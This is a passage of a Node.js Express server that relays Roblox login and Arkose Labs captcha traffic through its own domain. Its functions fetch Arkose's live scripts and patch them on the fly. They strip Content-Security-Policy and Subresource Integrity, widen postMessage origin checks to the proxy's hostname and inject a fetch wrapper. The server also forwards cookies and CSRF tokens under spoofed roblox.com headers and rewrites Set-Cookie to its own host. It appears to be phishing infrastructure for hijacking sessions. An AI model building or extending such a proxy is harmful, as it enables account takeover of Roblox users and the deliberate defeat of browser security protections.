        // Live: k returns t.durl or t.surl (Arkose CDN URLs from session data).
        // Patched: always return location.origin so all assets load via proxy.
        const K_SEARCH  = 'var k=function(t,e){return t.dm&&t.durl?t.durl:t.surl}';
        const K_REPLACE = 'var k=function(t,e){return location.origin}';
        if (body.includes(K_SEARCH)) {
            body = body.replace(K_SEARCH, K_REPLACE);
            console.log('[bootstrap] ✅ Patch 2: publicPath k() → location.origin');
        } else {
            console.warn('[bootstrap] ⚠️  Patch 2: k() target not found — Arkose may have updated');
        }

        // ── Patch 3: Rewrite init-load fetch URL to use location.origin ───────
        // Live: uses r (= k(e) = CDN URL) as the base for the init-load call.
        // Patched: hardcode location.origin so the call routes through the proxy.
        const INIT_SEARCH  = '"".concat(r,"/fc/init-load/?session_token=")';
        const INIT_REPLACE = '"".concat(location.origin,"/fc/init-load/?session_token=")';
        if (body.includes(INIT_SEARCH)) {
            body = body.replace(INIT_SEARCH, INIT_REPLACE);
            console.log('[bootstrap] ✅ Patch 3: init-load fetch → location.origin');
        } else {
            console.warn('[bootstrap] ⚠️  Patch 3: init-load target not found — Arkose may have updated');
        }

        // ── Patch 4: Rewrite game-core index.html URL to use location.origin ──
        // Live: "".concat(t) where t is the session CDN URL.
        // Patched: "".concat(location.origin) so the game-core iframe loads via proxy.
        const GC_SEARCH  = '"".concat(t).concat("","/fc/assets/ec-game-core/game-core/")';
        const GC_REPLACE = '"".concat(location.origin).concat("","/fc/assets/ec-game-core/game-core/")';
        if (body.includes(GC_SEARCH)) {
            body = body.replace(GC_SEARCH, GC_REPLACE);
            console.log('[bootstrap] ✅ Patch 4: game-core index.html URL → location.origin');
        } else {
            console.warn('[bootstrap] ⚠️  Patch 4: game-core URL target not found — Arkose may have updated');
        }

        res.status(200)
           .setHeader('Content-Type', 'application/javascript; charset=utf-8')
           .setHeader('Cache-Control', 'public, max-age=3600')
           .send(body);
    } catch (err) {
        console.error(`[bootstrap] Error: ${err.message} — falling back to local file`);
        res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
        res.sendFile(path.join(__dirname, 'fc/assets/ec-game-core/bootstrap/1.29.6/standard/game_core_bootstrap.js'));
    }
}

app.get(/(?:\/(?:cdn\/)?fc)?\/assets\/ec-game-core\/bootstrap\/[^/]+\/[^/]+\/game_core_bootstrap\.js(\?.*)?$/, proxyBootstrapJs);


// game-core index.html — fetch live from Arkose, strip SRI on the fly.
async function proxyGameCoreHtml(req, res) {
    const origin = req.headers['origin'] || `https://${req.headers.host}`;
    setCors(res, origin);

    const pathMatch = req.path.match(/\/game-core\/([^/]+)\/([^/]+)\/index\.html/);
    const version = pathMatch ? pathMatch[1] : '1.29.6';
    const mode    = pathMatch ? pathMatch[2] : 'compat';
    const targetUrl = `https://arkoselabs.roblox.com/fc/assets/ec-game-core/game-core/${version}/${mode}/index.html`;
    console.log(`[game-core-html] Live proxy: ${req.path} → ${targetUrl}`);

    try {
        const result = await makeCurlRequest('GET', targetUrl, {
            'User-Agent': BROWSER_UA,
            'Accept': 'text/html,*/*',
            'Referer': 'https://www.roblox.com/',
        }, null, false);

        if (result.statusCode >= 400) {
            console.warn(`[game-core-html] Arkose returned ${result.statusCode}`);
            return res.status(result.statusCode).end();
        }

        let body = result.body.toString();

        // ── Patch: Strip Subresource Integrity from the main.js <script> loader ──
        // Live index.html includes integrity + crossorigin on the dynamically injected
        // <script> for main.js. If the browser ever receives a patched main.js the hash
        // would mismatch and block load. Removing them lets main.js load freely.
        const SRI_SEARCH  = /s\.integrity='[^']*';\s*s\.crossorigin='[^']*';/g;
        if (SRI_SEARCH.test(body)) {
            body = body.replace(/s\.integrity='[^']*';\s*s\.crossorigin='[^']*';/g, '');
            console.log('[game-core-html] ✅ Patch: SRI integrity + crossorigin stripped from main.js loader');
        } else {
            console.warn('[game-core-html] ⚠️  Patch: SRI target not found — Arkose may have updated');
        }

        res.status(200)
           .setHeader('Content-Type', 'text/html; charset=utf-8')
           .setHeader('Cache-Control', 'public, max-age=3600')
           .send(body);
    } catch (err) {
        console.error(`[game-core-html] Error: ${err.message}`);
        res.status(500).end();
    }
}

app.get(/(?:\/(?:cdn\/)?fc)?\/assets\/ec-game-core\/game-core\/[^/]+\/[^/]+\/index\.html(\?.*)?$/, proxyGameCoreHtml);

// game-core JS files — fetch live from Arkose; patch 133.vendors on the fly, pass rest through.
async function proxyGameCoreJs(req, res) {
    const origin = req.headers['origin'] || `https://${req.headers.host}`;
    setCors(res, origin);

    const pathMatch = req.path.match(/\/game-core\/([^/]+)\/([^/]+)\/(.+\.js)/);
    const version  = pathMatch ? pathMatch[1] : '1.29.6';
    const mode     = pathMatch ? pathMatch[2] : 'compat';
    const filename = pathMatch ? pathMatch[3] : path.basename(req.path.split('?')[0]);
    const targetUrl = `https://arkoselabs.roblox.com/fc/assets/ec-game-core/game-core/${version}/${mode}/${filename}`;
    console.log(`[game-core-js] Live proxy: ${filename}`);

    try {
        const result = await makeCurlRequest('GET', targetUrl, {
            'User-Agent': BROWSER_UA,
            'Accept': '*/*',
            'Referer': 'https://www.roblox.com/',
        }, null, false);

        if (result.statusCode >= 400) {
            console.warn(`[game-core-js] Arkose returned ${result.statusCode} for ${filename}`);
            return res.status(result.statusCode).end();
        }

        let body = result.body.toString();

        // ── Patch: Prepend fetch X-Proxy injection to 133.vendors only ───────────
        // 133.vendors is the first webpack chunk executed in the game-core frame.
        // Injecting the fetch wrapper here ensures every subsequent fetch call
        // inside the game frame also carries the X-Proxy header automatically.
        if (filename.startsWith('133.vendors')) {
            const XPROXY_INJECT = `fetch=((f=fetch)=>(u,i={})=>(i.headers={...i.headers,'X-Proxy':window.top.document.querySelector('meta[name="proxy"]').getAttribute('value')||''},f(u,i)))();`;
            body = XPROXY_INJECT + body;
            console.log('[game-core-js] ✅ Patch: fetch X-Proxy injection prepended to 133.vendors');
        }

        res.status(200)
           .setHeader('Content-Type', 'application/javascript; charset=utf-8')
           .setHeader('Cache-Control', 'public, max-age=3600')
           .send(body);
    } catch (err) {
        console.error(`[game-core-js] Error fetching ${filename}: ${err.message}`);
        res.status(500).end();
    }
}

app.get(/(?:\/(?:cdn\/)?fc)?\/assets\/ec-game-core\/game-core\/[^/]+\/[^/]+\/(.+\.js)(\?.*)?$/, proxyGameCoreJs);

// Version-agnostic match-game remoteEntry.js — serve local copy if it exists, else fall through to CDN proxy
app.get(/(?:\/(?:cdn\/)?fc)?\/assets\/ec-game-core\/match-game\/[^/]+\/[^/]+\/remoteEntry\.js(\?.*)?$/, (req, res, next) => {
    const localFile = path.join(__dirname, 'fc/assets/ec-game-core/match-game/1.29.6/compat/remoteEntry.js');
    const fs = require('fs');
    if (fs.existsSync(localFile)) {
        console.log(`[match-game] Serving local remoteEntry.js`);
        res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
        res.setHeader('Cache-Control', 'public, max-age=3600');
        res.sendFile(localFile, (err) => {
            if (err) { console.error('[match-game] Error:', err.message); res.status(500).end(); }
        });
    } else {
        console.log(`[match-game] remoteEntry.js not found locally, falling through to CDN proxy`);
        next();
    }
});

// Serve /cdn/fc from local fc/ folder (handles 1.29.6 chunk files, remoteEntry, etc.)
// Falls through to Arkose proxy for anything not present locally.
app.use('/cdn/fc', express.static(path.join(__dirname, 'fc')));

// Serve /fc from local fc/ folder. Falls through to Arkose for missing files.
app.use('/fc', express.static(path.join(__dirname, 'fc')));

// ═════════════════════════════════════════════════════════════════════════════
// ═══ FIXED: ARKOSE /fc/ ROUTES - ADDED MISSING ENDPOINTS ═════════════════════
// ═════════════════════════════════════════════════════════════════════════════

// /fc/a/ - Action reporting endpoint (reports site URL, events)
app.use('/fc/a', createCurlProxy('arkoselabs.roblox.com', '/fc/a', false));

// /fc/ca/ - Challenge answer endpoint
app.use('/fc/ca', createCurlProxy('arkoselabs.roblox.com', '/fc/ca', false));

// /fc/gfct/ - Game functionality endpoint (rewrites _challenge_imgs URLs only)
app.use('/fc/gfct', createGfctProxy());

// /fc/init-load/ - Initialization endpoint
// Arkose sometimes returns an empty 200 body for this endpoint which breaks
// JSON parsing in game_core_bootstrap.js.  Fall back to {} when that happens.
app.use('/fc/init-load', async (req, res) => {
    const origin = req.headers['origin'] || `https://${req.headers.host}`;
    setCors(res, origin);
    const qs = req.url.includes('?') ? req.url.slice(req.url.indexOf('?')) : '';
    const targetUrl = `https://arkoselabs.roblox.com/fc/init-load/${qs}`;
    const headers = {
        'Origin': 'https://www.roblox.com',
        'Referer': 'https://www.roblox.com/login',
        'User-Agent': req.headers['user-agent'] || BROWSER_UA,
        'Accept': 'application/json, text/plain, */*',
    };
    if (req.headers['cookie']) headers['Cookie'] = req.headers['cookie'];
    try {
        const result = await makeCurlRequest(req.method, targetUrl, headers, null, false);
        const bodyStr = result.body ? result.body.toString().trim() : '';
        if (!bodyStr || bodyStr.length === 0) {
            console.log('[fc/init-load] Empty response from Arkose — returning fallback {}');
            res.set('Content-Type', 'application/json');
            res.status(200).send('{}');
        } else {
            res.set('Content-Type', result.headers['content-type'] || 'application/json');
            res.status(result.statusCode).send(bodyStr);
        }
    } catch (e) {
        console.error('[fc/init-load] Error:', e.message);
        res.set('Content-Type', 'application/json');
        res.status(200).send('{}');
    }
});

// /pows/setup — proxy to arkoselabs.roblox.com without any URL rewriting.
// The PoW iframe and its assets now load directly from arkoselabs.roblox.com.
app.get('/pows/setup', async (req, res) => {
    const origin = req.headers['origin'] || `https://${req.headers.host}`;
    const proxyOrigin = origin.startsWith('https://') ? origin : `https://${req.headers.host}`;
    setCors(res, origin);

    const qs = req.url.includes('?') ? req.url.slice(req.url.indexOf('?')) : '';
    const targetUrl = `https://arkoselabs.roblox.com/pows/setup${qs}`;

    try {
        const result = await makeCurlRequest('GET', targetUrl, {
            'Origin':  'https://www.roblox.com',
            'Referer': 'https://www.roblox.com/login',
            'User-Agent': req.headers['user-agent'] || BROWSER_UA,
            'Accept': 'application/json, */*',
        }, null, false);

        let body = result.body.toString();
        // NOTE: Domain rewrite disabled - arkose pow setup loads directly from arkoselabs.roblox.com
        // body = body.replace(/https:\/\/arkoselabs\.roblox\.com/g, proxyOrigin);

        console.log(`[pows/setup] Serving pow setup directly from arkoselabs.roblox.com`);
        res.setHeader('Content-Type', 'application/json; charset=utf-8');
        res.setHeader('Access-Control-Allow-Origin', '*');
        res.status(result.statusCode).send(body);
    } catch (err) {
        console.error(`[pows/setup] Error: ${err.message}`);
        res.status(502).json({ error: 'pows/setup proxy error' });
    }
});

// /pows/ - Proof of Work endpoints (all other pows routes)
app.use('/pows', createCurlProxy('arkoselabs.roblox.com', '/pows', false));

// /powseq/ - PoW sequence endpoint (dynamic compat JS files)
app.use('/powseq', createCurlProxy('arkoselabs.roblox.com', '/powseq', false));

// /params/ - Parameters endpoint
app.use('/params', createCurlProxy('arkoselabs.roblox.com', '/params', false));

// /rtig/ - Real-time image generation
app.use('/rtig', createCurlProxy('arkoselabs.roblox.com', '/rtig', false));

// /cdn/fc/assets/pow/ - PoW challenge UI: Route removed to allow direct loading from arkoselabs.roblox.com
// The pow assets now load directly without being intercepted or modified

// /cdn/fc/ - CDN assets for FunCaptcha (generic fallback)
app.use('/cdn/fc', createCurlProxy('arkoselabs.roblox.com', '/cdn/fc', false));

app.use('/cdn/fc/assets', createCurlProxy('arkoselabs.roblox.com', '/cdn/fc/assets', false));

app.use('/game/report-stats', createCurlProxy('www.roblox.com', '/game/report-stats', false));

app.use('/game/report-event', createCurlProxy('www.roblox.com', '/game/report-event', false));

// /assets/ec-game-core/ - Game core bootstrap assets for captcha (REQUIRED for captcha to load)
app.use('/assets/ec-game-core', createCurlProxy('arkoselabs.roblox.com', '/assets/ec-game-core', false));

// /public_key/ - Public key endpoint for captcha (REQUIRED for captcha initialization)
app.use('/public_key', createCurlProxy('arkoselabs.roblox.com', '/public_key', false));

// /fc/gt2/ - Public key / token endpoint (rewrites challenge_url_cdn to relative path only)
app.use('/fc/gt2', createGt2Proxy());

// Other /fc routes
for (const route of ['/fc', '/pows', '/rtig', '/params', '/cdn']) {
    app.use(route, createCurlProxy('arkoselabs.roblox.com', route, false));
}

// ─────────────────────────────────────────────────────────────
// CAPTCHA METADATA — proxy to real captcha.roblox.com for full key list
// ─────────────────────────────────────────────────────────────
app.use('/captcha/v1/metadata', createCurlProxy('captcha.roblox.com', '/v1/metadata', false));

// ─────────────────────────────────────────────────────────────
// ARKOSE SETTINGS STUB
// ─────────────────────────────────────────────────────────────
app.get('/v2/:publicKey/settings.json', createCurlProxy('arkoselabs.roblox.com', '', false));

// ─────────────────────────────────────────────────────────────
// ARKOSE LABS API.JS - LIVE PROXY FROM ARKOSE CDN
// Real Arkose api.js files dynamically detect their own load origin,
// so all downstream requests (enforcement, settings, game-core) route
// back through whatever domain loaded the script — our proxy.
// Local files are kept as fallbacks only.
// ─────────────────────────────────────────────────────────────
app.get('/v2/api.js', (req, res) => proxyApiJs(req, res, 'api-loader.js'));

app.get('/v2//api.js', (req, res) => proxyApiJs(req, res, 'api-loader.js'));

app.get(/^\/v2\/[A-F0-9]{8}-[A-F0-9]{4}-[A-F0-9]{4}-[A-F0-9]{4}-[A-F0-9]{12}\/api\.js$/i,
    (req, res) => proxyApiJs(req, res, 'api-core.js'));

// ═════════════════════════════════════════════════════════════════════════════
// ═══ LIVE ARKOSE ENFORCEMENT PROXY ════════════════════════════════════════════
// Enforcement HTML and JS are fetched live from Arkose's CDN so we always get
// the current version (4.0.16+). The enforcement JS is patched on-the-fly to:
//   1. Accept postMessages from our proxy domain (not just *.arkoselabs.com)
//   2. Strip Content-Security-Policy so modified scripts can execute
// ═════════════════════════════════════════════════════════════════════════════

async function proxyApiJs(req, res, localFallback) {
    const origin = req.headers['origin'] || `https://${req.headers.host}`;
    setCors(res, origin);
    const targetUrl = `https://arkoselabs.roblox.com${req.path}`;
    console.log(`[api-js] Live proxy: ${req.path}`);
    try {
        const result = await makeCurlRequest('GET', targetUrl, {
            'User-Agent': BROWSER_UA,
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Referer': 'https://www.roblox.com/',
        }, null, false);
        if (result.statusCode >= 400) {
            console.warn(`[api-js] CDN returned ${result.statusCode} for ${req.path}, falling back to local`);
            res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
            return res.sendFile(path.join(__dirname, 'modified-js', localFallback));
        }
        let body = result.body.toString();

        // ── Inject x-proxy header into the gt2/public_key request ──
        // Only patch the full UUID client (api-core.js), not the small loader.
        // Exact target (from live Arkose source):
        //   {"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8"},
        // Becomes:
        //   {"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8", 'x-proxy': window.top.document.querySelector('meta[name="proxy"]').getAttribute('value')},
        if (localFallback === 'api-core.js') {
            // ── Patch 1: inject x-proxy header into the gt2/public_key request ──
            const XPROXY_SEARCH  = '{"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8"},';
            const XPROXY_REPLACE = '{"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8", \'x-proxy\': window.top.document.querySelector(\'meta[name="proxy"]\').getAttribute(\'value\')},';
            if (body.includes(XPROXY_SEARCH)) {
                body = body.replace(XPROXY_SEARCH, XPROXY_REPLACE);
                console.log('[api-js] ✅ Patch 1: x-proxy header injected');
            } else {
                console.warn('[api-js] ⚠️ Patch 1: x-proxy target not found — Arkose may have updated their bundle');
            }

            // ── Patch 2: fix settings endpoint — /settings → /settings.json ──
            const SETTINGS_SEARCH  = 'Vo.publicKey,"/settings")';
            const SETTINGS_REPLACE = 'Vo.publicKey,"/settings.json")';
            if (body.includes(SETTINGS_SEARCH)) {
                body = body.replace(SETTINGS_SEARCH, SETTINGS_REPLACE);
                console.log('[api-js] ✅ Patch 2: /settings → /settings.json');
            } else {
                console.warn('[api-js] ⚠️ Patch 2: /settings target not found — Arkose may have updated their bundle');
            }
        }

        res.status(result.statusCode)
           .setHeader('Content-Type', 'application/javascript; charset=utf-8')
           .setHeader('Cache-Control', 'public, max-age=3600')
           .send(body);
    } catch (err) {
        console.error(`[api-js] Error: ${err.message} — falling back to ${localFallback}`);
        res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
        res.sendFile(path.join(__dirname, 'modified-js', localFallback));
    }
}

async function proxyEnforcementHtml(req, res) {
    const origin = req.headers['origin'] || `https://${req.headers.host}`;
    setCors(res, origin);
    const targetUrl = `https://arkoselabs.roblox.com${req.path}`;
    console.log(`[enforcement-html] Live proxy: ${req.path}`);
    try {
        const result = await makeCurlRequest('GET', targetUrl, {
            'User-Agent': BROWSER_UA,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Referer': 'https://www.roblox.com/',
        }, null, false);
        let body = result.body.toString();
        // If Arkose returns a non-OK status, fall back to the local file
        if (result.statusCode >= 400) {
            console.warn(`[enforcement-html] CDN returned ${result.statusCode}, falling back to local file`);
            res.setHeader('Content-Type', 'text/html; charset=utf-8');
            return res.sendFile(path.join(__dirname, 'modified-js', 'enforcement.b68ab7a7f261051e8c53cfe808ea9418.html'));
        }

        // ── Patch 1: Remove CSP meta tag from HTML body ──────────────────────
        // Live Arkose HTML includes a <meta http-equiv="Content-Security-Policy">
        // that locks resource loading to *.arkoselabs.com — strip it so our
        // proxy-served assets are allowed to load.
        body = body.replace(/<meta[^>]*http-equiv\s*=\s*["']?Content-Security-Policy["']?[^>]*>/gi, '');
        console.log('[enforcement-html] ✅ Patch 1: CSP meta tag removed');

        // ── Patch 2: Strip nonce from <style> tags ───────────────────────────
        // The nonce is paired with the CSP above; once CSP is gone the nonce
        // attr is harmless but removing it keeps the output clean.
        body = body.replace(/(<style)[^>]*\snonce\s*=\s*["'][^"']*["']([^>]*>)/gi, '$1$2');
        console.log('[enforcement-html] ✅ Patch 2: style nonce stripped');

        // ── Patch 3: Remove integrity + crossorigin + data-nonce from <script> ─
        // SRI integrity="sha384-..." makes the browser reject any script whose
        // bytes differ from the hash — which breaks as soon as our proxy serves
        // it or Arkose rotates the file.  Strip all three enforcement attrs.
        body = body.replace(/\s*integrity\s*=\s*["'][^"']*["']/gi, '');
        body = body.replace(/\s*crossorigin\s*=\s*["'][^"']*["']/gi, '');
        body = body.replace(/\s*data-nonce\s*=\s*["'][^"']*["']/gi, '');
        console.log('[enforcement-html] ✅ Patch 3: integrity / crossorigin / data-nonce removed from script');

        // ── Patch 4: Inject spinner + fade-in CSS ────────────────────────────
        // The modified enforcement HTML includes @keyframes spin/fadeIn and two
        // obfuscated CSS classes (.h1o9jYZG2hr8hElVsTr0 spinner, .b41jtjet1y76JICPFc59
        // fade-in container) that the enforcement JS references internally.
        // We inject them as a separate <style> block before </head>.
        const EXTRA_CSS = `<style>
        @keyframes spin {
          0% { transform: rotate(0deg) translateZ(0); }
          100% { transform: rotate(360deg) translateZ(0); }
        }
        @keyframes fadeIn {
          0% { opacity: 0; }
          100% { opacity: 1; }
        }
        .h1o9jYZG2hr8hElVsTr0 {
            position: absolute; top: 50%; left: 50%; margin-left: -15px; margin-top: -15px;
            z-index: 1010; border-radius: 50%; width: 30px; height: 30px; border-width: 3px;
            border-style: solid; border-color: rgba(0,0,0,0) rgba(0,0,0,0) rgba(0,0,0,0) rgba(0,0,0,0.2);
            transform: translateZ(0); box-sizing: border-box;
            animation: 500ms linear 0s infinite spin;
        }
        .b41jtjet1y76JICPFc59 {
            transition: opacity 500ms ease 0s, transform 500ms ease 0s;
            opacity: 0; transform: scale(0.8); text-align: center; height: 100%;
        }
        .b41jtjet1y76JICPFc59.active { opacity: 1; transform: scale(1); }
        </style>`;
        if (body.includes('</head>')) {
            body = body.replace('</head>', EXTRA_CSS + '</head>');
            console.log('[enforcement-html] ✅ Patch 4: spinner + fade-in CSS injected');
        } else {
            console.warn('[enforcement-html] ⚠️ Patch 4: </head> not found — CSS not injected');
        }

        res.removeHeader('Content-Security-Policy');
        res.status(result.statusCode)
           .setHeader('Content-Type', 'text/html; charset=utf-8')
           .setHeader('Cache-Control', 'public, max-age=3600')
           .send(body);
    } catch (err) {
        console.error(`[enforcement-html] Error: ${err.message} — falling back to local file`);
        res.setHeader('Content-Type', 'text/html; charset=utf-8');
        res.sendFile(path.join(__dirname, 'modified-js', 'enforcement.b68ab7a7f261051e8c53cfe808ea9418.html'));
    }
}

async function proxyEnforcementJs(req, res) {
    const origin = req.headers['origin'] || `https://${req.headers.host}`;
    setCors(res, origin);
    const targetUrl = `https://arkoselabs.roblox.com${req.path}`;
    console.log(`[enforcement-js] Live proxy: ${req.path}`);
    try {
        const result = await makeCurlRequest('GET', targetUrl, {
            'User-Agent': BROWSER_UA,
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Referer': 'https://www.roblox.com/',
        }, null, false);
        if (result.statusCode >= 400) {
            console.warn(`[enforcement-js] CDN returned ${result.statusCode}, falling back to local file`);
            res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
            return res.sendFile(path.join(__dirname, 'modified-js', 'enforcement.b68ab7a7f261051e8c53cfe808ea9418.js'));
        }
        let body = result.body.toString();

        // ── Patch 1: Accept postMessages from our proxy domain ──────────────
        // The enforcement JS checks that postMessages come from *.arkoselabs.com.
        // Since the game-core runs from our proxy origin we must include it.
        if (body.includes('"arkoselabs.com,funcaptcha.com"')) {
            body = body.replace(
                '"arkoselabs.com,funcaptcha.com"',
                '(location.hostname+",arkoselabs.com,funcaptcha.com")'
            );
            console.log('[enforcement-js] ✅ Patch 1a: incoming postMessage origin — arkoselabs.com,funcaptcha.com');
        } else {
            console.warn('[enforcement-js] ⚠️ Patch 1a: target not found');
        }
        if (body.includes('"funcaptcha.com,arkoselabs.com"')) {
            body = body.replace(
                '"funcaptcha.com,arkoselabs.com"',
                '(location.hostname+",funcaptcha.com,arkoselabs.com")'
            );
            console.log('[enforcement-js] ✅ Patch 1b: incoming postMessage origin — funcaptcha.com,arkoselabs.com');
        } else {
            console.warn('[enforcement-js] ⚠️ Patch 1b: target not found');
        }

        // ── Patch 2: Rewrite challenge_url_cdn to route through proxy ────────
        // Original: return t.challenge_url_cdn  (loads from arkoselabs.roblox.com directly)
        // Modified: replace arkoselabs.roblox.com with location.hostname so the
        //           game-core iframe loads back through our proxy domain.
        const CDN_SEARCH  = 'return t.challenge_url_cdn},';
        const CDN_REPLACE = "return t.challenge_url_cdn.replace('arkoselabs.roblox.com',location.hostname)},";
        if (body.includes(CDN_SEARCH)) {
            body = body.replace(CDN_SEARCH, CDN_REPLACE);
            console.log('[enforcement-js] ✅ Patch 2: challenge_url_cdn → location.hostname rewrite');
        } else {
            console.warn('[enforcement-js] ⚠️ Patch 2: challenge_url_cdn target not found — Arkose may have updated');
        }

        // ── Patch 3: Use "*" wildcard as postMessage target origin ────────────
        // The live enforcement JS uses this.config.target as the target origin
        // for all outgoing postMessage calls. Replacing with "*" mirrors the
        // uploaded modified file's behaviour and ensures messages reach the
        // proxy parent regardless of origin restrictions.
        const PM_SEARCH  = 't.postMessage(function(t){return JSON.stringify(t)}(a),this.config.target)';
        const PM_REPLACE = 't.postMessage(function(t){return JSON.stringify(t)}(a),"*")';
        if (body.includes(PM_SEARCH)) {
            body = body.replace(PM_SEARCH, PM_REPLACE);
            console.log('[enforcement-js] ✅ Patch 3: postMessage target origin → "*" wildcard');
        } else {
            console.warn('[enforcement-js] ⚠️ Patch 3: postMessage target not found — Arkose may have updated');
        }

        res.status(result.statusCode)
           .setHeader('Content-Type', 'application/javascript; charset=utf-8')
           .setHeader('Cache-Control', 'public, max-age=3600')
           .send(body);
    } catch (err) {
        console.error(`[enforcement-js] Error: ${err.message} — falling back to local file`);
        res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
        res.sendFile(path.join(__dirname, 'modified-js', 'enforcement.b68ab7a7f261051e8c53cfe808ea9418.js'));
    }
}

// Pattern: /v2/{version}/enforcement.{hash}.html
app.get(/^\/v2\/\d+\.\d+\.\d+\/enforcement\.[a-f0-9]+\.html$/i, proxyEnforcementHtml);

// Pattern: /{version}/enforcement.{hash}.html (without /v2 prefix)
app.get(/^\/\d+\.\d+\.\d+\/enforcement\.[a-f0-9]+\.html$/i, proxyEnforcementHtml);

// Pattern: /v2/{version}/enforcement.{hash}.js
app.get(/^\/v2\/\d+\.\d+\.\d+\/enforcement\.[a-f0-9]+\.js$/i, proxyEnforcementJs);

// Pattern: /{version}/enforcement.{hash}.js (without /v2 prefix)
app.get(/^\/\d+\.\d+\.\d+\/enforcement\.[a-f0-9]+\.js$/i, proxyEnforcementJs);

// ─────────────────────────────────────────────────────────────
// ARKOSE LABS CAPTCHA /v2/ ENDPOINTS
// ─────────────────────────────────────────────────────────────
app.use('/v2', async (req, res) => {
    const origin = req.headers['origin'] || `https://${req.headers.host}`;
    setCors(res, origin);

    const pathParts = req.path.split('/').filter(p => p.length > 0);
    
    // ═══ SAFETY CHECK: live-proxy enforcement files if they reach /v2 handler ═══
    if (pathParts.length >= 2 &&
        /^\d+\.\d+\.\d+$/.test(pathParts[0]) &&
        pathParts[1].startsWith('enforcement.')) {
        const filename = pathParts[1];
        if (filename.endsWith('.html')) {
            console.log(`[captcha] ⚠️ Enforcement HTML reached /v2 handler: ${req.path}`);
            return proxyEnforcementHtml(req, res);
        }
        if (filename.endsWith('.js')) {
            console.log(`[captcha] ⚠️ Enforcement JS reached /v2 handler: ${req.path}`);
            return proxyEnforcementJs(req, res);
        }
    }

    let targetPath = '/' + pathParts.join('/');
    let targetHost = ROBLOX_CAPTCHA_HOST;

    if (pathParts.length === 0) {
        console.log('[captcha] Empty /v2/ path, ignoring');
        return res.status(400).json({ error: 'Invalid path' });
    } else if (pathParts.length === 1 && pathParts[0] === 'api.js') {
        console.log(`[captcha] api.js no UUID -> should have been handled by local route`);
        return res.status(404).json({ error: 'api.js not found' });
    } else if (ARKOSE_PUBLIC_KEY_PATTERN.test(pathParts[0])) {
        const filename = pathParts[pathParts.length - 1] || '';
        if (filename === 'api.js') {
            console.log(`[captcha] api.js -> should have been handled by local route`);
            return res.status(404).json({ error: 'api.js not found' });

         } else if (/^enforcement\.[a-f0-9]+\.html$/i.test(filename)) {
            return proxyEnforcementHtml(req, res);
         } else if (/^enforcement\.[a-f0-9]+\.js$/i.test(filename)) {
            return proxyEnforcementJs(req, res);
   
        } else {
            targetHost = 'arkoselabs.roblox.com';
            targetPath = '/v2' + targetPath;
            console.log(`[captcha] ${filename} -> arkoselabs.roblox.com${targetPath}`);
        }
    } else if (pathParts[0] === 'funcaptcha' || pathParts[0] === 'challenge') {
        console.log(`[captcha] Funcaptcha/challenge: ${req.path}`);
    } else {
        targetHost = 'arkoselabs.roblox.com';
        console.log(`[captcha] Unknown /v2/ -> arkoselabs.roblox.com: ${req.path}`);
    }

    const qs = req.url.includes('?') ? req.url.slice(req.url.indexOf('?')) : '';
    const targetUrl = `https://${targetHost}${targetPath}${qs}`;

    console.log(`[captcha] ${req.method} ${req.path} → ${targetUrl}`);

    const headers = {
        'Origin':          'https://www.roblox.com',
        'Referer':         'https://www.roblox.com/login',
        'User-Agent':      req.headers['user-agent'] || BROWSER_UA,
        'Accept':          req.headers['accept'] || '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
    };

    if (req.headers['content-type']) {
        headers['Content-Type'] = req.headers['content-type'];
    }
    if (req.headers['cookie']) {
        headers['Cookie'] = req.headers['cookie'];
    }
    if (req.headers['x-csrf-token']) {
        headers['X-CSRF-Token'] = req.headers['x-csrf-token'];
    }
    if (req.headers['rbx-device-id']) {
        headers['rbx-device-id'] = req.headers['rbx-device-id'];
    }

    for (const h of CHALLENGE_HEADERS) {
        if (req.headers[h]) headers[h] = req.headers[h];
    }

    let body = null;
    if (['POST', 'PUT', 'PATCH'].includes(req.method.toUpperCase())) {
        body = await new Promise((resolve) => {
            const bufs = [];
            req.on('data', c => bufs.push(c));
            req.on('end', () => resolve(Buffer.concat(bufs)));
        });
    }

    try {
        const isApiJs = targetUrl.includes('api.js');
        const result = await makeCurlRequest(
            req.method,
            targetUrl,
            headers,
            body,
            false
        );

        console.log(`[captcha] ← ${result.statusCode}`);

        const skipHdrs = new Set([
            'content-security-policy', 'content-security-policy-report-only',
            'x-content-security-policy', 'transfer-encoding', 'connection',
            'content-encoding', 'keep-alive', 'proxy-authenticate',
            'proxy-authorization', 'te', 'trailers', 'upgrade'
        ]);

        for (const [k, v] of Object.entries(result.headers)) {
            if (skipHdrs.has(k)) continue;
            if (k === 'set-cookie') {
                res.set('Set-Cookie', rewriteCookies([].concat(v), getCleanHost(req)));
            } else {
                try { res.set(k, v); } catch (_) {}
            }
        }

        if (req.path.endsWith('.js') && !result.headers['content-type']) {
            res.set('Content-Type', 'application/javascript; charset=utf-8');
        }

        res.status(result.statusCode).send(result.body);

    } catch (err) {
        console.error(`[captcha] ❌ ${req.method} ${req.path} | ${err.message}`);
        if (!res.headersSent) {
            res.status(502).json({ error: 'Captcha proxy error', message: err.message });
        }
    }
});

// ─────────────────────────────────────────────────────────────
// FUNCAPTCHA DIRECT PATHS
// ─────────────────────────────────────────────────────────────
app.use('/funcaptcha', async (req, res) => {
    const origin = req.headers['origin'] || `https://${req.headers.host}`;
    setCors(res, origin);

    let targetPath = req.path.replace(/\/+/g, '/');
    if (!targetPath.startsWith('/')) targetPath = '/' + targetPath;

    const qs = req.url.includes('?') ? req.url.slice(req.url.indexOf('?')) : '';
    const targetUrl = `https://${ROBLOX_CAPTCHA_HOST}/funcaptcha${targetPath}${qs}`;

    console.log(`[funcaptcha] ${req.method} ${req.path} → ${targetUrl}`);

    const headers = {
        'Origin':          'https://www.roblox.com',
        'Referer':         'https://www.roblox.com/login',
